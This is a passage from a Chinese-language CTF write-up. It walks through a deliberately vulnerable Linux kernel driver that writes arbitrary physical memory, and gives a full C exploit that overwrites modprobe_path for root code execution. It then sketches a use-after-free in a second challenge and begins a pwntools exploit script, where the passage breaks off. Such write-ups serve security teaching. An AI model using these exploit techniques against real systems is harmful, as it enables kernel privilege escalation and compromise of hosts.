                <span class="n">iounmap</span><span class="p">(</span><span class="n">mem</span><span class="p">);</span>

            <span class="n">mem</span> <span class="o">=</span> <span class="n">ioremap</span><span class="p">(</span><span class="n">_map</span><span class="p">.</span><span class="n">phys_addr</span><span class="p">,</span> <span class="n">_map</span><span class="p">.</span><span class="n">size</span><span class="p">);</span>

            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">mem</span><span class="p">)</span> <span class="p">{</span>
                <span class="k">return</span> <span class="o">-</span><span class="n">EFAULT</span><span class="p">;</span>
            <span class="p">}</span>
            <span class="k">break</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">case</span> <span class="n">IOCTL_WRITE_PHYS_MEM</span><span class="p">:</span> <span class="p">{</span>
            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">mem</span><span class="p">)</span>
                <span class="k">return</span> <span class="o">-</span><span class="n">EFAULT</span><span class="p">;</span>

            <span class="k">if</span> <span class="p">(</span><span class="n">copy_from_user</span><span class="p">(</span><span class="o">&amp;</span><span class="n">_write</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span><span class="n">arg</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">_write</span><span class="p">)))</span> <span class="p">{</span>
                <span class="k">return</span> <span class="o">-</span><span class="n">EFAULT</span><span class="p">;</span>
            <span class="p">}</span>

            <span class="n">size</span> <span class="o">=</span> <span class="n">_write</span><span class="p">.</span><span class="n">size</span><span class="p">;</span>

            <span class="k">if</span> <span class="p">(</span><span class="n">size</span> <span class="o">&gt;</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">kernel_buffer</span><span class="p">))</span>
                <span class="n">size</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">kernel_buffer</span><span class="p">);</span>

            <span class="k">if</span> <span class="p">(</span><span class="n">copy_from_user</span><span class="p">(</span><span class="n">kernel_buffer</span><span class="p">,</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">_write</span><span class="p">.</span><span class="n">in_data</span><span class="p">,</span> <span class="n">size</span><span class="p">))</span>
                <span class="k">return</span> <span class="o">-</span><span class="n">EFAULT</span><span class="p">;</span>

            <span class="n">memcpy_toio</span><span class="p">(</span><span class="n">mem</span><span class="p">,</span> <span class="n">kernel_buffer</span><span class="p">,</span> <span class="n">size</span><span class="p">);</span>
            <span class="k">break</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="nl">default:</span>
            <span class="k">return</span> <span class="o">-</span><span class="n">EINVAL</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kt">int</span> <span class="n">__init</span> <span class="nf">init_dev</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
    <span class="n">reg</span> <span class="o">=</span> <span class="n">misc_register</span><span class="p">(</span><span class="o">&amp;</span><span class="n">physler_dev</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">reg</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
        <span class="n">printk</span><span class="p">(</span><span class="s">"[-] Failed to register physler!"</span><span class="p">);</span>

    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">};</span>

<span class="k">static</span> <span class="kt">void</span> <span class="n">__exit</span> <span class="nf">exit_dev</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
    <span class="n">misc_deregister</span><span class="p">(</span><span class="o">&amp;</span><span class="n">physler_dev</span><span class="p">);</span>
<span class="p">}</span>

<span class="n">module_init</span><span class="p">(</span><span class="n">init_dev</span><span class="p">);</span>
<span class="n">module_exit</span><span class="p">(</span><span class="n">exit_dev</span><span class="p">);</span>
</pre></td></tr></tbody></table></code></div></div>

<p>​<code class="language-plaintext highlighter-rouge">physler.h</code>​</p>

<div class="language-c highlighter-rouge"><div class="code-header">
        <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
</pre></td><td class="rouge-code"><pre><span class="cp">#include</span> <span class="cpf">&lt;linux/string.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;linux/fs.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;linux/slab.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;linux/miscdevice.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;linux/random.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;linux/module.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;linux/kernel.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;linux/fs.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;linux/ioctl.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;linux/mm.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;linux/uaccess.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;linux/io.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;linux/cdev.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;linux/device.h&gt;</span><span class="cp">
</span>

<span class="cp">#define IOCTL_MAP_PHYS_ADDR 0x1001
#define IOCTL_READ_PHYS_MEM 0x2002
#define IOCTL_WRITE_PHYS_MEM 0x3003
</span>
<span class="cp">#define BUF_SIZE 4096
</span>
<span class="kt">int</span> <span class="n">reg</span><span class="p">;</span>

<span class="k">static</span> <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">phys_addr</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
<span class="k">static</span> <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">size</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
<span class="k">static</span> <span class="kt">void</span> <span class="n">__iomem</span> <span class="o">*</span><span class="n">mem</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
<span class="k">static</span> <span class="kt">char</span> <span class="n">kernel_buffer</span><span class="p">[</span><span class="n">BUF_SIZE</span><span class="p">];</span>

<span class="k">static</span> <span class="k">struct</span> <span class="n">ioctl_map</span> <span class="p">{</span>
    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">phys_addr</span><span class="p">;</span>
    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">size</span><span class="p">;</span>
<span class="p">};</span>

<span class="k">static</span> <span class="k">struct</span> <span class="n">ioctl_write</span> <span class="p">{</span>
    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">size</span><span class="p">;</span>
    <span class="kt">unsigned</span> <span class="kt">char</span><span class="o">*</span> <span class="n">in_data</span><span class="p">;</span>
<span class="p">};</span>


<span class="k">static</span> <span class="n">noinline</span> <span class="kt">long</span> <span class="nf">ioctlHandler</span><span class="p">(</span><span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="n">file</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">cmd</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">arg</span><span class="p">);</span>
<span class="k">static</span> <span class="kt">int</span> <span class="n">__init</span> <span class="nf">init_dev</span><span class="p">(</span><span class="kt">void</span><span class="p">);</span>
<span class="k">static</span> <span class="kt">void</span> <span class="n">__exit</span> <span class="nf">exit_dev</span><span class="p">(</span><span class="kt">void</span><span class="p">);</span>

<span class="k">static</span> <span class="k">struct</span> <span class="n">file_operations</span> <span class="n">physler_fops</span> <span class="o">=</span> <span class="p">{.</span><span class="n">unlocked_ioctl</span> <span class="o">=</span> <span class="n">ioctlHandler</span><span class="p">};</span>

<span class="k">struct</span> <span class="n">miscdevice</span> <span class="n">physler_dev</span> <span class="o">=</span> <span class="p">{</span>
    <span class="p">.</span><span class="n">minor</span> <span class="o">=</span> <span class="n">MISC_DYNAMIC_MINOR</span><span class="p">,</span>
    <span class="p">.</span><span class="n">name</span> <span class="o">=</span> <span class="s">"physler"</span><span class="p">,</span>
    <span class="p">.</span><span class="n">fops</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">physler_fops</span><span class="p">,</span>
<span class="p">};</span>

<span class="n">MODULE_LICENSE</span><span class="p">(</span><span class="s">"WTF"</span><span class="p">);</span>
<span class="n">MODULE_AUTHOR</span><span class="p">(</span><span class="s">"kaker@keker"</span><span class="p">);</span>
<span class="n">MODULE_DESCRIPTION</span><span class="p">(</span><span class="s">"Same shit different day"</span><span class="p">);</span>
</pre></td></tr></tbody></table></code></div></div>

<p>‍</p>

<h3 id="关于ioremap"><span class="me-2">关于ioremap</span><a href="#关于ioremap" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<ul>
  <li>第一次接触这个，对这个不是太了解，下面是大模型 给出的 一下信息</li>
</ul>

<p><strong>工作机制</strong></p>

<ol>
  <li>
    <p>​<strong>​<code class="language-plaintext highlighter-rouge">ioremap</code>​</strong>​ <strong>的作用</strong>:</p>

    <ul>
      <li>将设备的物理内存地址（通常是 I/O 寄存器或内存映射区域）映射到内核虚拟地址空间中，供内核访问。</li>
      <li>设备驱动程序需要通过这种方式访问硬件资源，而不是直接操作物理地址。</li>
    </ul>
  </li>
  <li>
    <p>​<strong>​<code class="language-plaintext highlighter-rouge">iounmap</code>​</strong>​ <strong>的作用</strong>:</p>

    <ul>
      <li>释放之前通过 <code class="language-plaintext highlighter-rouge">ioremap</code>​ 映射的内存区域。</li>
      <li>内核的虚拟地址空间是有限的，尤其在 32 位系统上，因此释放不需要的映射是一个关键操作。</li>
    </ul>
  </li>
</ol>

<p>‍</p>

<p>​<code class="language-plaintext highlighter-rouge">grok 2</code>​</p>

<p>在讨论 ioremap 和 “direct mapping of all physical memory (page_offset_base)” 之间的关系之前，我们需要理解这两个概念：</p>

<ul>
  <li>ioremap：如前所述，是用来将设备的物理 I/O 内存映射到内核的虚拟地址空间。这种映射通常不是直接的，而是通过内核的地址转换机制（使用页表等）来实现的，目的是为了访问硬件设备的内存。</li>
  <li>direct mapping of all physical memory (page_offset_base)：这是指内核将物理内存直接映射到虚拟地址空间中的一种策略。在这种映射中，物理地址和虚拟地址之间的转换非常简单，通常只需要加上一个固定偏移量（page_offset_base），这在 Linux 内核中被称为线性映射或直接映射。具体来说，在 x86 体系结构上，内核的虚拟地址空间有一部分是用来直接映射物理内存的，这个映射通常从 PAGE_OFFSET 开始，任何在这一范围内的虚拟地址都对应一个物理地址，通过简单的加减 PAGE_OFFSET 就能得到对应的物理地址。</li>
</ul>

<p>关系：</p>

<p>虽然 ioremap 和直接映射的概念在目的上是类似的（将物理地址转为内核可用的虚拟地址），但它们在实现和用途上有所不同：</p>

<ul>
  <li>
    <p>不同点：</p>

    <ul>
      <li>映射类型：ioremap 用于将设备的 I/O 内存映射到内核虚拟地址空间。这种映射可能不直接对应到物理内存的线性映射区域，它可以是非缓存的或有特定缓存属性的。</li>
      <li>用途：ioremap 主要用于设备驱动程序，允许内核访问设备的内存空间，而直接映射（如 page_offset_base 所指）是内核对其自身内存使用的优化，使得内核可以快速访问大部分物理内存。</li>
      <li>范围和持久性：直接映射通常是全局的，涵盖了系统的大部分物理内存，并且映射是静态的或在系统启动时设置好的。相比之下，ioremap 的映射是动态的，根据需要创建和销毁。</li>
    </ul>
  </li>
  <li>
    <p>相似点：</p>

    <ul>
      <li>目的：两者都用于将物理地址转换为内核可以访问的虚拟地址。</li>
      <li>地址空间使用：它们都使用内核的虚拟地址空间，以提供对硬件或内存的访问。</li>
    </ul>
  </li>
</ul>

<p>总结来说，ioremap 和直接映射都是为了同一个目的——让内核可以安全、有效地访问物理地址，但它们在具体实现和应用场景上是有差异的。ioremap 提供了一种更灵活、适用于特定设备的访问方式，而直接映射则是对内核内存管理的一种优化策略。</p>

<p>‍</p>

<ul>
  <li>通过上面的信息我大概可以理解了（以下仅是我个人观点）</li>
</ul>

<p>‍</p>

<div class="language-c highlighter-rouge"><div class="code-header">
        <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre><span class="c1">// phys_addr 传入物理地址（不是虚拟内存） </span>
<span class="c1">// size 4k 对齐 0x1000</span>
<span class="kt">size_t</span> <span class="o">*</span> <span class="n">mem</span> <span class="o">=</span> <span class="n">ioremap</span><span class="p">(</span><span class="n">_map</span><span class="p">.</span><span class="n">phys_addr</span><span class="p">,</span> <span class="n">_map</span><span class="p">.</span><span class="n">size</span><span class="p">);</span>
<span class="c1">// ioremap 会返回物理内存映射出的虚拟内存 地址</span>
</pre></td></tr></tbody></table></code></div></div>

<p>​<a href="/assets/img/2025-CTFWP-images/2024-BRISC-CTF/assets/image-20241226163814-x4lvtqy.png" class="popup img-link  shimmer"><img src="/assets/img/2025-CTFWP-images/2024-BRISC-CTF/assets/image-20241226163814-x4lvtqy.png" alt="image" loading="lazy"></a>​</p>

<p>‍</p>

<ul>
  <li>​<code class="language-plaintext highlighter-rouge">pwndbg</code>​ 可以使用 <code class="language-plaintext highlighter-rouge">vprot</code>​ 查看虚拟内存，所展示的就是 虚拟内存</li>
</ul>

<p>​<a href="/assets/img/2025-CTFWP-images/2024-BRISC-CTF/assets/image-20241226163610-0bves41.png" class="popup img-link  shimmer"><img src="/assets/img/2025-CTFWP-images/2024-BRISC-CTF/assets/image-20241226163610-0bves41.png" alt="image" loading="lazy"></a>​</p>

<p>‍</p>

<p>可以修改 <code class="language-plaintext highlighter-rouge">modprobe_path</code>​物理内存（同时虚拟内存的内容也会被修改，因为它只是物理内存的映射）</p>

<p>​<a href="/assets/img/2025-CTFWP-images/2024-BRISC-CTF/assets/image-20241226164059-rg25k6l.png" class="popup img-link  shimmer"><img src="/assets/img/2025-CTFWP-images/2024-BRISC-CTF/assets/image-20241226164059-rg25k6l.png" alt="image" loading="lazy"></a>​</p>

<p>​<a href="/assets/img/2025-CTFWP-images/2024-BRISC-CTF/assets/image-20241226163942-h74n6g2.png" class="popup img-link  shimmer"><img src="/assets/img/2025-CTFWP-images/2024-BRISC-CTF/assets/image-20241226163942-h74n6g2.png" alt="image" loading="lazy"></a>​</p>

<p>​<a href="/assets/img/2025-CTFWP-images/2024-BRISC-CTF/assets/image-20241226163848-n0lrk9m.png" class="popup img-link  shimmer"><img src="/assets/img/2025-CTFWP-images/2024-BRISC-CTF/assets/image-20241226163848-n0lrk9m.png" alt="image" loading="lazy"></a>​</p>

<ul>
  <li>确定 modprobe_path 的物理地址</li>
</ul>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre><span class="mh">0xffff888000000000</span> <span class="c1"># 物理内存映射的起始地址
</span><span class="mh">0xffff888002dd5820</span> <span class="c1">#  +0x2dd5820 就是 modprobe_path 的映射地址，
</span>
<span class="c1"># 所以 modprobe_path 的物理内存 地址就是 0x2dd5820 
</span></pre></td></tr></tbody></table></code></div></div>

<p>‍</p>

<ul>
  <li>exploit</li>
</ul>

<p>​<a href="/assets/img/2025-CTFWP-images/2024-BRISC-CTF/assets/image-20241226171912-nb6jcrt.png" class="popup img-link  shimmer"><img src="/assets/img/2025-CTFWP-images/2024-BRISC-CTF/assets/image-20241226171912-nb6jcrt.png" alt="image" loading="lazy"></a>​</p>

<p>执行copy后，再次查看</p>

<p>​<a href="/assets/img/2025-CTFWP-images/2024-BRISC-CTF/assets/image-20241226171935-dxk7obw.png" class="popup img-link  shimmer"><img src="/assets/img/2025-CTFWP-images/2024-BRISC-CTF/assets/image-20241226171935-dxk7obw.png" alt="image" loading="lazy"></a>​</p>

<p>‍</p>

<div class="language-c highlighter-rouge"><div class="code-header">
        <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
</pre></td><td class="rouge-code"><pre><span class="cp">#include</span> <span class="cpf">"minilib.h"</span><span class="cp">
#define stbase(value) ((value) - 0xffffffff81000000ULL)
</span>

<span class="kt">size_t</span> <span class="n">nokaslr_kernel_base</span>  <span class="o">=</span> <span class="mh">0xffffffff81000000</span><span class="p">;</span>
<span class="kt">char</span> <span class="o">*</span><span class="n">procn</span> <span class="o">=</span> <span class="s">"/dev/physler"</span><span class="p">;</span>
<span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>


<span class="k">static</span> <span class="kt">void</span> <span class="nf">shellcode</span><span class="p">(){</span>
    <span class="n">asm</span> <span class="k">volatile</span> <span class="p">(</span>
        <span class="s">"xor rdi, rdi;"</span>
        <span class="s">"mov rcx, prepare_kernel_cred;"</span>
        <span class="s">"call rcx;"</span>
        <span class="s">"mov rcx, commit_creds;"</span>
        <span class="s">"call rcx;"</span>
        <span class="c1">// swapgs_restore_regs_and_return_to_usermode -- mov rdi,rsp</span>
    <span class="p">);</span>
    <span class="c1">// restore_flags</span>
    <span class="n">asm</span> <span class="k">volatile</span> <span class="p">(</span>
        <span class="s">"push user_ss;"</span>
        <span class="s">"push user_sp;"</span>
        <span class="s">"push user_rflags;"</span>
        <span class="s">"push user_cs;"</span>
        <span class="s">"push shell_addr;"</span>
        <span class="s">"swapgs;"</span>
        <span class="s">"iretq;"</span>
    <span class="p">);</span>
<span class="p">}</span>
<span class="k">static</span> <span class="kt">void</span> <span class="nf">end_shellcode</span><span class="p">(){</span> <span class="k">return</span><span class="p">;</span> <span class="p">}</span>
<span class="kt">size_t</span> <span class="n">sc_addr</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">shellcode</span> <span class="o">+</span> <span class="mi">8</span><span class="p">;</span>

<span class="k">struct</span> <span class="n">ioctl_write</span> <span class="p">{</span>
  <span class="kt">char</span> <span class="o">*</span> <span class="n">in_data</span><span class="p">;</span>
  <span class="kt">size_t</span> <span class="n">size</span><span class="p">;</span>
<span class="p">};</span>

<span class="kt">void</span> <span class="nf">add</span><span class="p">(</span><span class="k">struct</span> <span class="n">ioctl_write</span> <span class="n">buf</span><span class="p">){</span>
    <span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="mh">0x1001</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">buf</span><span class="p">);</span>
<span class="p">}</span>
<span class="kt">void</span> <span class="nf">edit</span><span class="p">(</span><span class="k">struct</span> <span class="n">ioctl_write</span> <span class="n">buf</span><span class="p">){</span>
    <span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mh">0x3003</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">buf</span><span class="p">);</span>
<span class="p">}</span>
<span class="kt">void</span> <span class="nf">doMain</span><span class="p">(){</span>
    <span class="c1">// size_t sc_size = &amp;end_shellcode-&amp;shellcode;</span>
  
    <span class="n">save_status</span><span class="p">();</span>

    <span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="n">procn</span><span class="p">,</span><span class="mi">2</span><span class="p">);</span>
    <span class="n">lss</span><span class="p">(</span><span class="s">"fd"</span><span class="p">,</span><span class="n">fd</span><span class="p">);</span>

    <span class="k">struct</span> <span class="n">ioctl_write</span> <span class="n">buf</span><span class="p">;</span>

    <span class="n">buf</span><span class="p">.</span><span class="n">in_data</span> <span class="o">=</span> <span class="mh">0x2dd5820</span><span class="p">;</span>
    <span class="n">buf</span><span class="p">.</span><span class="n">size</span> <span class="o">=</span> <span class="mh">0x1000</span><span class="p">;</span>

    <span class="n">add</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
    <span class="kt">char</span> <span class="n">path</span><span class="p">[]</span> <span class="o">=</span> <span class="s">"/tmp/e1"</span><span class="p">;</span>
    <span class="n">buf</span><span class="p">.</span><span class="n">in_data</span> <span class="o">=</span> <span class="mi">8</span><span class="p">;</span>
    <span class="n">buf</span><span class="p">.</span><span class="n">size</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">path</span><span class="p">;</span>
    <span class="n">edit</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
    <span class="n">modprobe_rce</span><span class="p">();</span>

<span class="p">}</span>
<span class="k">extern</span> <span class="kt">void</span> <span class="nf">_start</span><span class="p">(){</span>
    <span class="kt">size_t</span> <span class="n">env</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
    <span class="n">environ</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">env</span><span class="p">[</span><span class="mi">4</span><span class="p">];</span>
    <span class="n">doMain</span><span class="p">();</span>
    <span class="n">syscall64</span><span class="p">(</span><span class="mi">60</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
<span class="p">}</span>





</pre></td></tr></tbody></table></code></div></div>

<p>‍</p>

<h2 id="medium-chains"><span class="me-2">medium-chains</span><a href="#medium-chains" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<h3 id="漏洞触发点"><span class="me-2">漏洞触发点</span><a href="#漏洞触发点" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="nf">add_proxy</span><span class="p">(</span><span class="sh">'</span><span class="s">1</span><span class="sh">'</span><span class="p">,</span><span class="mh">0x123</span><span class="p">)</span> <span class="c1"># 添加一个 代理
</span></pre></td></tr></tbody></table></code></div></div>

<p>​<a href="/assets/img/2025-CTFWP-images/2024-BRISC-CTF/assets/image-20250101151956-861ay3a.png" class="popup img-link  shimmer"><img src="/assets/img/2025-CTFWP-images/2024-BRISC-CTF/assets/image-20250101151956-861ay3a.png" alt="image" loading="lazy"></a>​</p>

<p>​<a href="/assets/img/2025-CTFWP-images/2024-BRISC-CTF/assets/image-20250101152039-yum1yhx.png" class="popup img-link  shimmer"><img src="/assets/img/2025-CTFWP-images/2024-BRISC-CTF/assets/image-20250101152039-yum1yhx.png" alt="image" loading="lazy"></a>​</p>

<p>‍</p>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="nf">add_chain</span><span class="p">(</span><span class="mi">1</span><span class="p">,[</span><span class="mi">0</span><span class="p">])</span> <span class="c1"># 添加一个代理链
</span></pre></td></tr></tbody></table></code></div></div>

<p>​<a href="/assets/img/2025-CTFWP-images/2024-BRISC-CTF/assets/image-20250101152107-zkifn2x.png" class="popup img-link  shimmer"><img src="/assets/img/2025-CTFWP-images/2024-BRISC-CTF/assets/image-20250101152107-zkifn2x.png" alt="image" loading="lazy"></a>​</p>

<p>‍</p>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre><span class="nf">delete_chain</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="c1"># 删掉这个代理链,
# chains[0] 指针清空, proxies[0]也被free,但是么没有把 proxies[0] 清空
# 这就构成里一个UAF
</span></pre></td></tr></tbody></table></code></div></div>

<p>​<a href="/assets/img/2025-CTFWP-images/2024-BRISC-CTF/assets/image-20250101152154-od6qn0n.png" class="popup img-link  shimmer"><img src="/assets/img/2025-CTFWP-images/2024-BRISC-CTF/assets/image-20250101152154-od6qn0n.png" alt="image" loading="lazy"></a>​</p>

<p>‍</p>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="nf">delete_proxy</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</pre></td></tr></tbody></table></code></div></div>

<p>​<a href="/assets/img/2025-CTFWP-images/2024-BRISC-CTF/assets/image-20250101152240-93n6thx.png" class="popup img-link  shimmer"><img src="/assets/img/2025-CTFWP-images/2024-BRISC-CTF/assets/image-20250101152240-93n6thx.png" alt="image" loading="lazy"></a>​</p>

<p>​<a href="/assets/img/2025-CTFWP-images/2024-BRISC-CTF/assets/image-20250101152332-ht2sjqu.png" class="popup img-link  shimmer"><img src="/assets/img/2025-CTFWP-images/2024-BRISC-CTF/assets/image-20250101152332-ht2sjqu.png" alt="image" loading="lazy"></a>​</p>

<p>‍</p>

<p>‍</p>

<p>‍</p>

<ul>
  <li>exploit 考验一点堆风水, 我瞎几把写的比较乱</li>
</ul>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131
132
133
134
135
136
137
138
139
140
141
142
143
144
145
146
147
148
149
150
151
152
153
154
155
156
157
158
159
160
161
162
163
164
165
166
167
168
169
170
171
172
173
174
175
176
177
178
179
180
181
182
183
184
185
186
187
188
189
190
</pre></td><td class="rouge-code"><pre><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">import</span> <span class="n">sys</span>

<span class="c1"># Define lambda functions for common operations
</span><span class="n">s</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">sa</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">sendafter</span><span class="p">(</span><span class="n">delim</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
<span class="n">sl</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">sla</span>     <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="n">delim</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
<span class="n">r</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">num</span>                <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="n">num</span><span class="p">)</span>
<span class="n">ru</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delims</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="bp">True</span>  <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="n">delims</span><span class="p">,</span> <span class="n">drop</span><span class="p">)</span>
<span class="n">rl</span>      <span class="o">=</span> <span class="k">lambda</span>                    <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">recvline</span><span class="p">()</span>
<span class="n">uu32</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="nf">u32</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span><span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">))</span>
